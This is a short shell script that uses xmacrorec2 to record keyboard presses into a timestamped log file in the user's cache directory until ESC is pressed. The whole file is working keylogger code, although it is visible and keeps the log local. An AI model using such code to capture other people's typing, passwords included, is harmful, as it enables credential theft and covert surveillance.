#!/bin/sh
#
# Stores keyboard presses in a log file
# the logging is stopped pressing the ESC button
# This script is done just out of curiosity, 
# don't use it to deceive people.
#
# Needs xmacro installed

LOG=${XDG_CACHE_HOME:-"$HOME/.cache"}/$(date +%F_%H%M).log

log() {
    while true
    do
	read key || break

	# remove first 12 chars
	key=${key:12}

	case $key in
	    ?)  # alphanumeric keystroke
		printf $key
		;;
	    space)
		printf " "
		;;
	    apostrophe)
		printf \'
		;;
	    comma)
		printf ','
		;;
	    period)
		printf '.'
		;;
	    minus)
		printf "-"
		;;
	    BackSpace)
		printf "«"
		;;
	    Delete)
		printf "»"
		;;
	    ISO_Level3_Shift) # AltGr
		printf "¬"
		;;
	    Shift_?)
		printf "^"
		;;
	    Control_?)
		printf "\nC^"
		;;
	    Super_?)
		printf "\nS^"
		;;
	    *)
		# add a newline
		echo " «$key»"
		;;
	esac
    done
}

xmacrorec2 -k 9 | grep KeyStrPress | log > $LOG

echo "Writen to \"$LOG\""

